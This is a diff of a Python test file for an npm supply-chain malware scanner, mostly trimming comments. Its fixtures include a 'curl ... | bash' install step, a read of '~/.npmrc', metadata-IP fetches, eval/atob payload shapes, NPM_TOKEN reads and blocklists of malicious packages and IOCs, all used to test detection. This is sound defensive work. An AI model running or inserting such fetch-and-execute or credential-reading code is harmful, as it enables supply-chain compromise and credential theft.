@@ -19,9 +19,6 @@ sys.path.insert(0, str(REPO_ROOT))
 from scripts import scan_npm_packages as snp  # noqa: E402
 
 
-# ---------------------------------------------------------------------------
-
-
 def _run_scanner(lockfile: Path, *, timeout: int = 30) -> subprocess.CompletedProcess:
     return subprocess.run(
         [sys.executable, str(SCRIPT), "--lockfile", str(lockfile)],
@@ -29,11 +26,6 @@ def _run_scanner(lockfile: Path, *, timeout: int = 30) -> subprocess.CompletedPr
         text = True,
         timeout = timeout,
     )
-
-
-# ---------------------------------------------------------------------------
-# Lockfile pass: structural-only fixtures (no network).
-# ---------------------------------------------------------------------------
 
 
 def test_malicious_lockfile_exits_1():
@@ -46,11 +38,8 @@ def test_malicious_lockfile_exits_1():
         f"--- stdout ---\n{proc.stdout}\n--- stderr ---\n{proc.stderr}"
     )
     combined = proc.stdout + proc.stderr
-    # Scanner aggregates structural findings into the summary;
-    # assert on count + FAIL banner.
     assert "2 structural finding(s)" in combined
     assert "FAIL" in combined
-    # Confirm parse_lockfile() surfaces the right pattern codes via the in-process API.
     entries, struct = snp.parse_lockfile(fixture)
     patterns = {f.pattern for f in struct}
     assert {"non-registry-resolved-url", "missing-integrity-hash"} <= patterns
@@ -68,10 +57,6 @@ def test_clean_lockfile_exits_0():
     assert "0 finding(s)" in proc.stdout
     assert "0 hard error(s)" in proc.stdout
 
-
-# ---------------------------------------------------------------------------
-# BLOCKED_NPM_VERSIONS table -- gated on Fork 1.
-# ---------------------------------------------------------------------------
 
 _BLOCKED_AVAILABLE = hasattr(snp, "BLOCKED_NPM_VERSIONS")
 
@@ -103,20 +88,16 @@ def test_blocked_npm_versions_complete():
     )
     assert "0.9.5" in table["@uipath/rpa-tool"]
 
-    # Aikido (May-12 wave): @mistralai/* npm scope (separate from PyPI mistralai).
     assert table["@mistralai/mistralai"] == {"2.2.2", "2.2.3", "2.2.4"}
     assert table["@mistralai/mistralai-gcp"] == {"1.7.1", "1.7.2", "1.7.3"}
     assert table["@mistralai/mistralai-azure"] == {"1.7.1", "1.7.2", "1.7.3"}
 
-    # Aikido: @tallyui/* (10 packages x 3 versions).
     tallyui = [k for k in table if k.startswith("@tallyui/")]
     assert len(tallyui) == 10, f"expected 10 @tallyui/*, got {sorted(tallyui)}"
 
-    # Aikido: @beproduct/nestjs-auth covers the 0.1.2 ..
-    # 0.1.19 range (18 versions).
+    # Aikido: @beproduct/nestjs-auth covers 0.1.2..0.1.19.
     assert table["@beproduct/nestjs-auth"] == {f"0.1.{i}" for i in range(2, 20)}
 
-    # Aikido: unscoped infostealer packages (10 total).
     for unscoped in (
         "safe-action",
         "ts-dna",
@@ -131,7 +112,6 @@ def test_blocked_npm_versions_complete():
     ):
         assert unscoped in table, f"missing unscoped malicious pkg: {unscoped}"
 
-    # Aikido: payload SHA-256 hashes wired into KNOWN_IOC_STRINGS.
     ioc = snp.KNOWN_IOC_STRINGS
     assert "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c" in ioc
     assert "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96" in ioc
@@ -149,11 +129,6 @@ def test_blocked_npm_versions_short_circuits_download():
     assert proc.returncode == 1
     combined = proc.stdout + proc.stderr
     assert "blocked-known-malicious" in combined or "BLOCKED_NPM_VERSIONS" in combined
-
-
-# ---------------------------------------------------------------------------
-# KNOWN_IOC_STRINGS coverage -- every IOC must trip the scanner.
-# ---------------------------------------------------------------------------
 
 
 def _extract_pkg_with_ioc(ioc: str, tmp_path: Path) -> Path:
@@ -195,11 +170,6 @@ def test_every_known_ioc_string_caught(tmp_path):
         )
 
 
-# ---------------------------------------------------------------------------
-# Sanity: lockfile parse pass surfaces the structural findings we expect.
-# ---------------------------------------------------------------------------
-
-
 def test_parse_lockfile_structural_findings():
     """Structural-only fixture yields 2 structural findings and 0 entries."""
     entries, struct = snp.parse_lockfile(FIXTURES / "structural_only_lockfile.json")
@@ -207,12 +177,6 @@ def test_parse_lockfile_structural_findings():
     patterns = {f.pattern for f in struct}
     assert "non-registry-resolved-url" in patterns
     assert "missing-integrity-hash" in patterns
-
-
-# ---------------------------------------------------------------------------
-# Code-only scanning (_strip_js_noncode): blank comments WITHOUT touching
-# strings/regex/code, preserve geometry, fail open on lexer confusion.
-# ---------------------------------------------------------------------------
 
 
 def _strip(src):
@@ -254,11 +218,10 @@ def test_strip_preserves_assigned_base64_payload():
 
 def test_strip_fails_open_on_unterminated_block_comment():
     src = "code(); /* never closed"
-    assert snp._strip_js_noncode(src) == src  # fail open: unchanged, still fully scanned
+    assert snp._strip_js_noncode(src) == src
 
 
 def test_strip_only_applies_to_js_family():
-    # A `//`-containing JSON/YAML string must be left intact (JS lexer must not apply).
     PKG = snp.PackageEntry(
         name = "x",
         version = "1.0.0",
@@ -268,14 +231,9 @@ def test_strip_only_applies_to_js_family():
     )
     # scan_text_blob strips for .js but not for .json.
     yaml_like = 'url: "http://h"  # a yaml comment, not JS\n'
-    # Verify the stripper is gated on suffix (JS lexer not applied to non-JS suffixes).
     assert "".endswith(snp._JS_FAMILY_SUFFIXES) is False
     assert ".js" in snp._JS_FAMILY_SUFFIXES and ".json" not in snp._JS_FAMILY_SUFFIXES
 
-
-# ---------------------------------------------------------------------------
-# Detection survives stripping; comment-only IOC is suppressed.
-# ---------------------------------------------------------------------------
 
 _PKG = snp.PackageEntry(
     name = "x",
@@ -288,11 +246,9 @@ _BLOB = "QWxhZGRpbg" * 240  # ~2.4 KiB base64-ish
 
 
 def test_real_payload_still_flags_after_stripping():
-    # Obfuscated blob behind Function(), wrapped in comments that get blanked.
     src = f'/* header */ var f = new Function("{_BLOB}"); f(); // tail\n'
     pats = {f.pattern for f in snp.scan_text_blob(_PKG, "m.js", src)}
     assert "obfuscated-blob" in pats
-    # eval-with-string + atob shape, comment between the two halves.
     src2 = "(0,eval)(/* x */ atob('ZG8='));"
     pats2 = {f.pattern for f in snp.scan_text_blob(_PKG, "m.js", src2)}
     assert "js-fetch-eval" in pats2
@@ -301,7 +257,7 @@ def test_real_payload_still_flags_after_stripping():
 def test_payload_entirely_in_comment_is_suppressed():
     src = f'/* var f = new Function("{_BLOB}"); */ var ok = 1;'
     js = snp.scan_text_blob(_PKG, "m.js", src)
-    assert js == []  # blanked -> clean
+    assert js == []
     txt = snp.scan_text_blob(_PKG, "m.txt", src)
     assert any(f.pattern == "obfuscated-blob" for f in txt)
 
@@ -311,11 +267,6 @@ def test_ioc_in_assigned_string_survives_stripping():
     src = 'var c = "filev2.getsession.org"; // doc note\n'
     pats = {f.pattern for f in snp.scan_text_blob(_PKG, "m.js", src)}
     assert "known-ioc-string" in pats
-
-
-# ---------------------------------------------------------------------------
-# Baseline allowlist -- suppress reviewed findings, fail on new kinds.
-# ---------------------------------------------------------------------------
 
 
 def _finding(
@@ -336,7 +287,6 @@ def test_norm_pkg_name_strips_version_keeps_scope():
 
 
 def test_baseline_key_is_version_stable():
-    # Same in-package path across a version bump -> identical key.
     a = _finding("left-pad@1.0.0", "package/index.js", "obfuscated-blob")
     b = _finding("left-pad@9.9.9", "package/index.js", "obfuscated-blob")
     assert snp._finding_key(a) == snp._finding_key(b)
@@ -371,7 +321,6 @@ def test_baseline_suppresses_listed_but_not_new_pattern(tmp_path):
     baseline = snp._load_baseline(str(bl))
 
     listed = _finding("aws-sdk@2.0.0", "package/metadata.js", "cred-surface-host (outbound)")
-    # A NEW kind of finding in the SAME file is a different pattern -> not suppressed.
     new_kind = _finding("aws-sdk@2.0.0", "package/metadata.js", "obfuscated-blob")
     active, suppressed = snp._partition_baseline([listed, new_kind], baseline)
     assert listed in suppressed
@@ -383,13 +332,12 @@ def test_write_then_load_baseline_roundtrip(tmp_path):
     findings = [
         _finding("evil@1.0.0", "package/a.js", "obfuscated-blob", snp.CRITICAL),
         _finding("evil@1.0.0", "package/a.js", "obfuscated-blob", snp.CRITICAL),
-        _finding("noise@1.0.0", "package/b.js", "js-env-token", snp.MEDIUM),  # below thresh
+        _finding("noise@1.0.0", "package/b.js", "js-env-token", snp.MEDIUM),
     ]
     n = snp._write_baseline(str(bl), findings, snp._SEVERITY_RANK[snp.HIGH])
-    assert n == 1  # dedup + MEDIUM excluded
+    assert n == 1
     keys = snp._load_baseline(str(bl))
     assert snp._finding_key(findings[0]) in keys
-    # MEDIUM below HIGH threshold -> not written.
     assert all(k[2] != "js-env-token" for k in keys)
 
 
@@ -403,11 +351,9 @@ def test_baseline_reopens_on_changed_evidence(tmp_path):
     snp._write_baseline(str(bl), [listed], snp._SEVERITY_RANK[snp.HIGH])
     baseline = snp._load_baseline(str(bl))
 
-    # The reviewed finding stays suppressed across a version bump (same evidence).
     same = _finding(
         "left-pad@9.9.9", "package/dist/index.js", "obfuscated-blob", evidence = "fetch('http://ok')"
     )
-    # A changed payload under the same package/file/pattern stays active.
     changed = _finding(
         "left-pad@9.9.9",
         "package/dist/index.js",
@@ -420,8 +366,6 @@ def test_baseline_reopens_on_changed_evidence(tmp_path):
 
 
 def test_obfuscated_blob_key_reopens_on_changed_tail():
-    # A large blob's evidence hash binds the full match (via a digest when the snippet is truncated), so changing only
-    # the payload tail reopens the key.
     pkg = snp.PackageEntry(
         name = "evil",
         version = "1.0.0",
@@ -448,8 +392,6 @@ def test_obfuscated_blob_key_reopens_on_changed_tail():
 
 
 def test_js_fetch_eval_payload_tail_reopens_key():
-    # The js-fetch-eval evidence digests the full containing line when the shown window truncates it, so a changed
-    # payload tail beyond the window reopens the key instead of riding the unchanged decoder head.
     pkg = snp.PackageEntry(
         name = "evil",
         version = "1.0.0",
@@ -471,8 +413,6 @@ def test_js_fetch_eval_payload_tail_reopens_key():
 
 
 def test_outbound_host_multiline_options_reopen():
-    # A multi-line outbound call binds its option/header lines, so changing the headers/body on a continuation line
-    # reopens the cred-surface-host key.
     pkg = snp.PackageEntry(
         name = "evil",
         version = "1.0.0",
@@ -498,8 +438,6 @@ def test_outbound_host_multiline_options_reopen():
 
 
 def test_outbound_host_config_multiline_object_reopens():
-    # A host-config object whose `{` is on a prior line still binds the whole object, so changing the path/headers on a
-    # following line reopens the key rather than riding the unchanged hostname line.
     pkg = snp.PackageEntry(
         name = "evil",
         version = "1.0.0",
@@ -544,8 +482,6 @@ def _host_finding(text):
 
 
 def test_outbound_host_config_long_object_binds_tail():
-    # A config object longer than the backward window still binds its tail, so a changed payload line well below the
-    # hostname reopens (not truncated away).
     filler = "\n".join(f"  opt{i}: {i}," for i in range(30))
     obj = (
         "const opts = {\n  hostname: '169.254.169.254',\n"
@@ -558,9 +494,6 @@ def test_outbound_host_config_long_object_binds_tail():
 
 
 def test_outbound_host_config_far_opener_binds():
-    # The enclosing object's opener can sit well above the hostname line (a large options object whose `{` is many
-    # properties back). The backward scan must still reach it so a payload changed on an earlier property of the same
-    # object reopens, not just a change on the hostname line itself.
     above = "\n".join(f"  opt{i}: {i}," for i in range(20))
     obj = (
         "const opts = {\n"
@@ -572,8 +505,6 @@ def test_outbound_host_config_far_opener_binds():
 
 
 def test_outbound_host_config_forward_cap_measured_from_match():
-    # With the opener near the backward-search limit, the forward group cap must be measured from the matched hostname
-    # line, not the opener, so the path that follows the hostname is still bound and a changed payload there reopens.
     above = "\n".join(f"  opt{i}: {i}," for i in range(198))
     obj = (
         "const opts = {\n"
@@ -586,7 +517,6 @@ def test_outbound_host_config_forward_cap_measured_from_match():
 
 
 def test_outbound_host_multiple_contexts_all_bind():
-    # The same contextual host can appear in more than one outbound form.
     base = "const u = 'http://169.254.169.254/latest/meta-data/';\nfetch(u);\n"
     extra = "https.request({\n  hostname: '169.254.169.254',\n  path: '/evil',\n});\n"
     assert snp._finding_key(_host_finding(base)) != snp._finding_key(_host_finding(base + extra))
@@ -601,10 +531,7 @@ def test_outbound_host_config_opener_after_unmatched_closer_binds():
 
 
 def test_outbound_host_config_close_then_open_same_line_binds():
-    # Stronger than the previous case: the unmatched closer and the host-config opener share ONE line, e.g. `}); const
-    # opts = {`. A net per-line bracket count nets that line to <= 0 and drops the trailing `{`, so the group would
-    # start at the hostname line and a changed path could ride the unchanged-hostname key. Order-aware reduction keeps
-    # the opener, so the path binds and a change reopens.
+    # The unmatched closer and the opener share one line; order-aware reduction keeps the `{`.
     obj = "}); const opts = {\n  hostname: '169.254.169.254',\n  path: '%s',\n};\nrun(opts);\n"
     assert snp._finding_key(_host_finding(obj % "/old")) != snp._finding_key(
         _host_finding(obj % "/evil")
@@ -612,16 +539,12 @@ def test_outbound_host_config_close_then_open_same_line_binds():
 
 
 def test_outbound_host_multiline_template_literal_reopens():
-    # A ) inside a multi-line backtick template literal must not close the call
-    # cannot mask a template literal that spans lines).
     old = "request(`http://169.254.169.254/x\n)`, {\n  headers: {a: 'old'},\n});\n"
     new = "request(`http://169.254.169.254/x\n)`, {\n  headers: {a: 'evil'},\n});\n"
     assert snp._finding_key(_host_finding(old)) != snp._finding_key(_host_finding(new))
 
 
 def test_cred_env_lifecycle_binds_whole_body():
-    # cred-env-in-lifecycle evidence pins the whole script body, so a changed non-token line (echo safe -> curl exfil)
-    # reopens even with the token line unchanged.
     def life(body):
         pkg = snp.PackageEntry(
             name = "e",
@@ -658,9 +581,7 @@ def _lifecycle_finding(body, frag):
 
 
 def test_lifecycle_fetch_exec_bounds_body_but_reopens():
-    # The whole install script is bound by a digest, but the stored evidence is a bounded matched snippet plus that
-    # digest, not the full body, so writing the baseline on a multi-KiB install script stays small while a change to
-    # any line (even far below the fetch-exec line) reopens the finding.
+    # Evidence is a bounded snippet plus a whole-body digest, so the baseline stays small.
     pad = "# pad\n" * 5000
     old = "curl https://x.sh | bash\n" + pad + "echo done_old"
     new = "curl https://x.sh | bash\n" + pad + "echo done_evil"
@@ -672,8 +593,6 @@ def test_lifecycle_fetch_exec_bounds_body_but_reopens():
 
 
 def test_cred_path_lifecycle_bounds_body_but_reopens():
-    # cred-path-in-lifecycle is bounded the same way: a snippet around the matched credential path plus the
-    # whole-body digest, so a far-line change reopens without storing the entire script body in the baseline.
     pad = "# pad\n" * 5000
     old = "cat ~/.npmrc\n" + pad + "echo old"
     new = "cat ~/.npmrc\n" + pad + "echo evil"
@@ -685,8 +604,6 @@ def test_cred_path_lifecycle_bounds_body_but_reopens():
 
 
 def test_outbound_host_regex_literal_does_not_close_group_early():
-    # A ) inside a JS regex literal must not close the outbound call early; the options object after the regex binds, so
-    # a changed header reopens.
     old = "request('http://169.254.169.254', /)/, {\n  headers: {a: 'old'},\n});\n"
     new = old.replace("old", "evil")
     assert snp._finding_key(_host_finding(old)) != snp._finding_key(_host_finding(new))
@@ -706,9 +623,7 @@ def test_evidence_overflow_binds_context_and_counts_all_matches():
 
 
 def test_evidence_caps_match_count_with_digest_remainder():
-    # Past _MAX_EVIDENCE_MATCHES the evidence folds the remaining matches into one
-    # digest so a huge/minified file cannot build an unbounded evidence string,
-    # while a changed match count past the cap still reopens.
+    # Past _MAX_EVIDENCE_MATCHES remaining matches fold into one digest to bound evidence size.
     over = snp._MAX_EVIDENCE_MATCHES + 20
     base = "".join(f"x{i} = process.env.NPM_TOKEN\n" for i in range(over))
     ev = snp._evidence(base, snp._JS_ENV_TOKEN)
@@ -719,10 +634,6 @@ def test_evidence_caps_match_count_with_digest_remainder():
 
 
 def test_evidence_streams_overflow_count_is_exact():
-    # The overflow matches are streamed from finditer (not collected into a list
-    # before the cap), so the "(+N more)" count must still equal the exact number of
-    # matches past the display cap for a large input, and the shown spans stay
-    # bounded to the cap.
     extra = 1000
     total = snp._MAX_EVIDENCE_MATCHES + extra
     body = "".join(f"x{i} = process.env.NPM_TOKEN\n" for i in range(total))
@@ -745,8 +656,6 @@ def _ioc_pkg():
 
 
 def test_known_ioc_evidence_binds_context_not_bare_needle():
-    # A known-ioc-string finding keys on the matched-line context, not the bare constant, so a changed adjacent
-    # fetch/exfil body on the same call reopens while the IOC needle stays in place.
     ioc = next(iter(snp.KNOWN_IOC_STRINGS))
     old = f"fetch('http://h/'+'{ioc}', {{body: 'OLD'}})\n"
     new = f"fetch('http://h/'+'{ioc}', {{body: 'EVIL'}})\n"
@@ -762,8 +671,6 @@ def test_known_ioc_evidence_binds_context_not_bare_needle():
 
 
 def test_always_bad_host_evidence_binds_outbound_context():
-    # cred-surface-host (always-bad) binds the outbound call context, so altering the exfil body on the same call
-    # reopens the key instead of riding the bare host literal.
     host = snp.CRED_HOST_ALWAYS_BAD[0][0]
     old = f"fetch('https://{host}/x', {{body: secretOLD}})\n"
     new = f"fetch('https://{host}/x', {{body: secretEVIL}})\n"
@@ -779,8 +686,6 @@ def test_always_bad_host_evidence_binds_outbound_context():
 
 
 def test_outbound_host_config_reindent_is_stable():
-    # A formatter-only reindent of the bound continuation lines must NOT change the key (whitespace is normalized before
-    # the logical-line digest).
     tight = "const opts = {\n  hostname: '169.254.169.254',\n  path: '/x',\n};\nrun(opts);\n"
     loose = (
         "const opts = {\n      hostname: '169.254.169.254',\n      path:    '/x',\n};\nrun(opts);\n"
@@ -822,8 +727,6 @@ def test_outbound_cred_surface_binds_context():
 
 
 def test_load_baseline_skips_non_dict_entries(tmp_path):
-    # A malformed current-schema baseline (non-dict entries, or a non-object root)
-    # must not crash the loader; bad entries are skipped, valid ones still load.
     bl = tmp_path / "bad.json"
     bl.write_text(
         json.dumps(
@@ -836,7 +739,6 @@ def test_load_baseline_skips_non_dict_entries(tmp_path):
     )
     keys = snp._load_baseline(str(bl))
     assert keys == {("p", "a.js", "x", snp._evidence_hash(""))}
-    # A non-object root is rejected with a warning, not a crash.
     arr = tmp_path / "arr.json"
     arr.write_text("[1, 2, 3]", encoding = "utf-8")
     assert snp._load_baseline(str(arr)) == set()
@@ -861,8 +763,6 @@ def test_legacy_schema_baseline_is_ignored(tmp_path):
 
 
 def test_v2_baseline_migrates_by_recomputing_hash(tmp_path):
-    # v2 shares v3's package-relative keying, so its entries migrate (the hash is recomputed from stored evidence)
-    # rather than being thrown away, matching the Python loader. An unchanged finding stays suppressed.
     bl = tmp_path / "v2.json"
     evidence = "fetch('http://ok')"
     bl.write_text(
@@ -889,8 +789,6 @@ def test_v2_baseline_migrates_by_recomputing_hash(tmp_path):
 
 
 def test_outbound_cred_surface_host_config_binds_full_context():
-    # The host-config branch captures the whole line (path + headers), so changing the outbound headers/body on the
-    # same hostname line reopens the key instead of letting an approved finding suppress a newly credentialed request.
     pkg = snp.PackageEntry(
         name = "evil",
         version = "1.0.0",
